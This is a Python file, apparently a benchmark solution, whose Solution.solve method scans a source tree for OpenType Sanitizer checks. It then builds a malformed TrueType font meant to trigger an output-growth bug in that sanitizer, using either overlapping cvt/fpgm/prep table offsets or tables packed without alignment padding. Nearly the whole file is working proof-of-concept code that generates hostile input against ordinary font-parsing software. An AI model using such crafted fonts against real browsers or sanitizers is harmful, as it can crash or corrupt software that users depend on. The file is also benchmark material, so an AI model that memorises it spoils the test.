import os
import re
import tarfile
from typing import Dict, List, Tuple, Optional


def _be16(x: int) -> bytes:
    return int(x & 0xFFFF).to_bytes(2, "big", signed=False)


def _bes16(x: int) -> bytes:
    return int(x).to_bytes(2, "big", signed=True)


def _be32(x: int) -> bytes:
    return int(x & 0xFFFFFFFF).to_bytes(4, "big", signed=False)


def _be64(x: int) -> bytes:
    return int(x & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "big", signed=False)


def _align4(n: int) -> int:
    return (n + 3) & ~3


def _checksum32(data: bytes) -> int:
    padded = data + b"\0" * ((4 - (len(data) & 3)) & 3)
    s = 0
    for i in range(0, len(padded), 4):
        s = (s + int.from_bytes(padded[i:i + 4], "big")) & 0xFFFFFFFF
    return s


def _sfnt_params(num_tables: int) -> Tuple[int, int, int]:
    # searchRange, entrySelector, rangeShift
    max_pow = 1
    entry_selector = 0
    while (max_pow << 1) <= num_tables:
        max_pow <<= 1
        entry_selector += 1
    search_range = max_pow * 16
    range_shift = num_tables * 16 - search_range
    return search_range, entry_selector, range_shift


def _build_head(index_to_loc_format: int = 0, check_sum_adjustment: int = 0) -> bytes:
    # head table: 54 bytes
    version = 0x00010000
    font_revision = 0x00010000
    magic = 0x5F0F3CF5
    flags = 0
    units_per_em = 1000
    created = 0
    modified = 0
    x_min = 0
    y_min = 0
    x_max = 0
    y_max = 0
    mac_style = 0
    lowest_rec_ppem = 8
    font_direction_hint = 2
    glyph_data_format = 0

    b = bytearray()
    b += _be32(version)
    b += _be32(font_revision)
    b += _be32(check_sum_adjustment)
    b += _be32(magic)
    b += _be16(flags)
    b += _be16(units_per_em)
    b += _be64(created)
    b += _be64(modified)
    b += _bes16(x_min)
    b += _bes16(y_min)
    b += _bes16(x_max)
    b += _bes16(y_max)
    b += _be16(mac_style)
    b += _be16(lowest_rec_ppem)
    b += _bes16(font_direction_hint)
    b += _bes16(index_to_loc_format)
    b += _bes16(glyph_data_format)
    assert len(b) == 54
    return bytes(b)


def _build_maxp(num_glyphs: int = 2) -> bytes:
    # maxp v1.0: 32 bytes
    version = 0x00010000
    b = bytearray()
    b += _be32(version)
    b += _be16(num_glyphs)
    # remaining 13 uint16 fields
    fields = [
        0,  # maxPoints
        0,  # maxContours
        0,  # maxCompositePoints
        0,  # maxCompositeContours
        2,  # maxZones
        0,  # maxTwilightPoints
        0,  # maxStorage
        0,  # maxFunctionDefs
        0,  # maxInstructionDefs
        0,  # maxStackElements
        0,  # maxSizeOfInstructions
        0,  # maxComponentElements
        0,  # maxComponentDepth
    ]
    for v in fields:
        b += _be16(v)
    assert len(b) == 32
    return bytes(b)


def _build_hhea(num_hmetrics: int = 2) -> bytes:
    # hhea: 36 bytes
    major = 1
    minor = 0
    ascender = 0
    descender = 0
    line_gap = 0
    advance_width_max = 500
    min_lsb = 0
    min_rsb = 0
    x_max_extent = 500
    caret_slope_rise = 1
    caret_slope_run = 0
    caret_offset = 0
    metric_data_format = 0

    b = bytearray()
    b += _be16(major)
    b += _be16(minor)
    b += _bes16(ascender)
    b += _bes16(descender)
    b += _bes16(line_gap)
    b += _be16(advance_width_max)
    b += _bes16(min_lsb)
    b += _bes16(min_rsb)
    b += _bes16(x_max_extent)
    b += _bes16(caret_slope_rise)
    b += _bes16(caret_slope_run)
    b += _bes16(caret_offset)
    b += _bes16(0)  # reserved
    b += _bes16(0)  # reserved
    b += _bes16(0)  # reserved
    b += _bes16(0)  # reserved
    b += _bes16(metric_data_format)
    b += _be16(num_hmetrics)
    assert len(b) == 36
    return bytes(b)


def _build_hmtx(num_hmetrics: int = 2) -> bytes:
    # full metrics for each glyph (since numHMetrics == numGlyphs)
    b = bytearray()
    for _ in range(num_hmetrics):
        b += _be16(500)  # advanceWidth
        b += _bes16(0)   # lsb
    return bytes(b)


def _build_glyf_empty_glyph() -> bytes:
    # Empty simple glyph: numberOfContours=0, bbox all 0
    return _bes16(0) + _bes16(0) + _bes16(0) + _bes16(0) + _bes16(0)


def _build_glyf(num_glyphs: int = 2) -> bytes:
    # Two empty glyphs, 10 bytes each
    return _build_glyf_empty_glyph() * num_glyphs


def _build_loca_short(offsets: List[int]) -> bytes:
    # offsets are byte offsets into glyf; store /2
    b = bytearray()
    for off in offsets:
        b += _be16(off // 2)
    return bytes(b)


def _build_cmap_format4_single(platform_id: int = 3, encoding_id: int = 1, codepoint: int = 0x0041, glyph_id: int = 1) -> bytes:
    # cmap table with one encoding record using format 4 subtable mapping codepoint -> glyph_id
    # segCount=2: one segment for codepoint, one sentinel.
    seg_count = 2
    seg_count_x2 = seg_count * 2
    search_range = 2 * (1 << (seg_count.bit_length() - 1))
    entry_selector = seg_count.bit_length() - 1
    range_shift = seg_count_x2 - search_range

    end_codes = [codepoint, 0xFFFF]
    start_codes = [codepoint, 0xFFFF]
    id_delta0 = (glyph_id - codepoint) & 0xFFFF
    id_deltas = [id_delta0, 1]
    id_range_offsets = [0, 0]

    sub = bytearray()
    sub += _be16(4)   # format
    sub_len_pos = len(sub)
    sub += _be16(0)   # length placeholder
    sub += _be16(0)   # language
    sub += _be16(seg_count_x2)
    sub += _be16(search_range)
    sub += _be16(entry_selector)
    sub += _be16(range_shift)
    for v in end_codes:
        sub += _be16(v)
    sub += _be16(0)  # reservedPad
    for v in start_codes:
        sub += _be16(v)
    for v in id_deltas:
        sub += _be16(v)
    for v in id_range_offsets:
        sub += _be16(v)
    sub_len = len(sub)
    sub[sub_len_pos:sub_len_pos + 2] = _be16(sub_len)

    cmap = bytearray()
    cmap += _be16(0)  # version
    cmap += _be16(1)  # numTables
    cmap += _be16(platform_id)
    cmap += _be16(encoding_id)
    cmap += _be32(12)  # offset to subtable (start after header + 1 encoding record)
    cmap += sub
    return bytes(cmap)


def _detect_constraints_from_source(src_path: str) -> Tuple[Optional[bool], Optional[bool]]:
    # Returns (overlap_enforced, offset_align_enforced) or (None,None) if unknown.
    # Heuristic: scan OTS-related sources for overlap checks and offset alignment checks.
    overlap_enforced = None
    align_enforced = None

    def consider_text(t: str) -> None:
        nonlocal overlap_enforced, align_enforced
        tl = t.lower()

        if align_enforced is None:
            # Look for offset alignment checks
            if re.search(r'offset\s*(?:%|&)\s*(?:4|0x3|3)\s*!=\s*0', tl):
                align_enforced = True
            elif "offset % 4" in tl or "offset&3" in tl or "offset & 3" in tl:
                if "!=" in tl or "== 0" in tl:
                    align_enforced = True

        if overlap_enforced is None:
            # Look for overlap checks in table directory parsing
            # e.g., "offset < last_offset + last_length", "overlap", "non-overlapping"
            if "non-overlap" in tl or "non overlap" in tl or "overlap" in tl:
                # Avoid setting True solely based on generic mention; require a comparison pattern too.
                if re.search(r'offset\s*<\s*[^;\n]{0,80}(?:last|prev|prior|end|limit)', tl) or re.search(r'(?:last|prev|prior)[^;\n]{0,50}(?:offset|end)\s*>\s*offset', tl):
                    overlap_enforced = True
            if re.search(r'offset\s*<\s*[^;\n]{0,60}(?:last|prev)[^;\n]{0,60}\+\s*[^;\n]{0,60}(?:length|len|size)', tl):
                overlap_enforced = True
            if re.search(r'(?:last|prev)[^;\n]{0,60}(?:offset|end)[^;\n]{0,20}\+\s*[^;\n]{0,60}(?:length|len|size)[^;\n]{0,20}>\s*offset', tl):
                overlap_enforced = True

    try:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not (lfn.endswith((".cc", ".cpp", ".c", ".h", ".hpp"))):
                        continue
                    full = os.path.join(root, fn)
                    if "ots" not in full.lower() and "opentype" not in full.lower():
                        continue
                    try:
                        with open(full, "rb") as f:
                            data = f.read()
                        consider_text(data.decode("utf-8", errors="ignore"))
                    except OSError:
                        pass
        else:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not name.endswith((".cc", ".cpp", ".c", ".h", ".hpp")):
                        continue
                    if "ots" not in name and "opentype" not in name:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    consider_text(data.decode("utf-8", errors="ignore"))
    except Exception:
        return None, None

    return overlap_enforced, align_enforced


def _build_font_overlap(shared_len: int = 512) -> bytes:
    # Tables
    num_glyphs = 2
    head = bytearray(_build_head(index_to_loc_format=0, check_sum_adjustment=0))
    maxp = _build_maxp(num_glyphs=num_glyphs)
    hhea = _build_hhea(num_hmetrics=num_glyphs)
    hmtx = _build_hmtx(num_hmetrics=num_glyphs)
    glyf = _build_glyf(num_glyphs=num_glyphs)
    loca_offsets = [0, 10, 20]
    loca = _build_loca_short(loca_offsets)
    cmap = _build_cmap_format4_single(codepoint=0x0041, glyph_id=1)

    if shared_len < 2:
        shared_len = 2
    if shared_len & 1:
        shared_len += 1
    shared = b"\0" * shared_len

    # Use overlapping offsets for cvt/fpgm/prep
    tables_unique: Dict[bytes, bytes] = {
        b"head": bytes(head),
        b"maxp": maxp,
        b"hhea": hhea,
        b"hmtx": hmtx,
        b"loca": loca,
        b"glyf": glyf,
        b"cmap": cmap,
    }
    overlap_tables: List[bytes] = [b"cvt ", b"fpgm", b"prep"]

    # Assign offsets
    tags_all = list(tables_unique.keys()) + overlap_tables
    num_tables = len(tags_all)
    search_range, entry_selector, range_shift = _sfnt_params(num_tables)

    header_and_dir_len = 12 + 16 * num_tables
    data_start = _align4(header_and_dir_len)

    offsets: Dict[bytes, int] = {}
    lengths: Dict[bytes, int] = {}

    cur = data_start
    # Place unique tables sequentially
    for tag in sorted(tables_unique.keys()):
        offsets[tag] = cur
        lengths[tag] = len(tables_unique[tag])
        cur = _align4(cur + len(tables_unique[tag]))

    shared_off = _align4(cur)
    for tag in overlap_tables:
        offsets[tag] = shared_off
        lengths[tag] = len(shared)
    file_end = shared_off + len(shared)

    # Build file buffer
    out = bytearray(b"\0" * file_end)
    # SFNT header (TrueType)
    out[0:4] = _be32(0x00010000)
    out[4:6] = _be16(num_tables)
    out[6:8] = _be16(search_range)
    out[8:10] = _be16(entry_selector)
    out[10:12] = _be16(range_shift)

    # Write table data for unique
    for tag, data in tables_unique.items():
        off = offsets[tag]
        out[off:off + len(data)] = data
    # Write shared blob once
    out[shared_off:shared_off + len(shared)] = shared

    # Compute checksums for directory (head checksum computed with checkSumAdjustment set to 0 per spec)
    def table_checksum(tag: bytes) -> int:
        if tag in overlap_tables:
            return _checksum32(shared)
        data = tables_unique[tag]
        if tag == b"head":
            tmp = bytearray(data)
            tmp[8:12] = b"\0\0\0\0"
            return _checksum32(bytes(tmp))
        return _checksum32(data)

    # Directory records: sort by offset, then tag for stability (helps if any parser expects sorted by offset)
    recs = []
    for tag in tags_all:
        recs.append((offsets[tag], tag))
    recs.sort(key=lambda x: (x[0], x[1]))

    dir_pos = 12
    for _, tag in recs:
        chksum = table_checksum(tag)
        out[dir_pos:dir_pos + 4] = tag
        out[dir_pos + 4:dir_pos + 8] = _be32(chksum)
        out[dir_pos + 8:dir_pos + 12] = _be32(offsets[tag])
        out[dir_pos + 12:dir_pos + 16] = _be32(lengths[tag])
        dir_pos += 16

    # Compute and set checkSumAdjustment in head
    full_sum = _checksum32(bytes(out))
    adj = (0xB1B0AFBA - full_sum) & 0xFFFFFFFF
    head_off = offsets[b"head"]
    out[head_off + 8:head_off + 12] = _be32(adj)

    return bytes(out)


def _build_font_misaligned_no_overlap(extra_unknown_tables: int = 0) -> bytes:
    # Pack tables back-to-back without 4-byte alignment padding, non-overlapping.
    # This only helps if the sanitizer outputs 4-aligned tables, increasing size.
    num_glyphs = 2
    head = bytearray(_build_head(index_to_loc_format=0, check_sum_adjustment=0))
    maxp = _build_maxp(num_glyphs=num_glyphs)
    hhea = _build_hhea(num_hmetrics=num_glyphs)
    hmtx = _build_hmtx(num_hmetrics=num_glyphs)
    glyf = _build_glyf(num_glyphs=num_glyphs)
    loca_offsets = [0, 10, 20]
    loca = _build_loca_short(loca_offsets)
    cmap = _build_cmap_format4_single(codepoint=0x0041, glyph_id=1)

    # Make these sizes intentionally awkward to maximize padding in output (if any)
    cvt = b"\0" * 514  # even
    fpgm = b"\0" * 513
    prep = b"\0" * 511

    tables: Dict[bytes, bytes] = {
        b"head": bytes(head),
        b"maxp": maxp,
        b"hhea": hhea,
        b"hmtx": hmtx,
        b"loca": loca,
        b"glyf": glyf,
        b"cmap": cmap,
        b"cvt ": cvt,
        b"fpgm": fpgm,
        b"prep": prep,
    }

    # Optional: add a few small unknown tables (only useful if sanitizer preserves unknown tables)
    for i in range(max(0, extra_unknown_tables)):
        tag = f"z{i:03d}".encode("ascii")  # 4 bytes for i<1000
        if len(tag) != 4 or tag in tables:
            continue
        tables[tag] = b"A"

    tags_all = list(tables.keys())
    num_tables = len(tags_all)
    search_range, entry_selector, range_shift = _sfnt_params(num_tables)

    header_and_dir_len = 12 + 16 * num_tables
    data_start = header_and_dir_len  # intentionally not aligned

    offsets: Dict[bytes, int] = {}
    lengths: Dict[bytes, int] = {}
    cur = data_start
    # Put in a stable order
    for tag in sorted(tags_all):
        offsets[tag] = cur
        lengths[tag] = len(tables[tag])
        cur += len(tables[tag])

    file_end = cur
    out = bytearray(b"\0" * file_end)
    out[0:4] = _be32(0x00010000)
    out[4:6] = _be16(num_tables)
    out[6:8] = _be16(search_range)
    out[8:10] = _be16(entry_selector)
    out[10:12] = _be16(range_shift)

    # Write table data
    for tag, data in tables.items():
        off = offsets[tag]
        out[off:off + len(data)] = data

    # Directory records
    def table_checksum(tag: bytes) -> int:
        data = tables[tag]
        if tag == b"head":
            tmp = bytearray(data)
            tmp[8:12] = b"\0\0\0\0"
            return _checksum32(bytes(tmp))
        return _checksum32(data)

    recs = []
    for tag in tags_all:
        recs.append((offsets[tag], tag))
    recs.sort(key=lambda x: (x[0], x[1]))

    dir_pos = 12
    for _, tag in recs:
        out[dir_pos:dir_pos + 4] = tag
        out[dir_pos + 4:dir_pos + 8] = _be32(table_checksum(tag))
        out[dir_pos + 8:dir_pos + 12] = _be32(offsets[tag])
        out[dir_pos + 12:dir_pos + 16] = _be32(lengths[tag])
        dir_pos += 16

    full_sum = _checksum32(bytes(out))
    adj = (0xB1B0AFBA - full_sum) & 0xFFFFFFFF
    head_off = offsets[b"head"]
    out[head_off + 8:head_off + 12] = _be32(adj)

    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        overlap_enforced, align_enforced = _detect_constraints_from_source(src_path)

        # Prefer overlap amplification when overlap checks appear absent or unknown.
        if overlap_enforced is not True:
            return _build_font_overlap(shared_len=512)

        # If overlap seems enforced, try misaligned non-overlapping layout (if alignment isn't enforced or unknown).
        if align_enforced is not True:
            return _build_font_misaligned_no_overlap(extra_unknown_tables=0)

        # Last resort: overlap anyway (most likely intended trigger for stream growth).
        return _build_font_overlap(shared_len=512)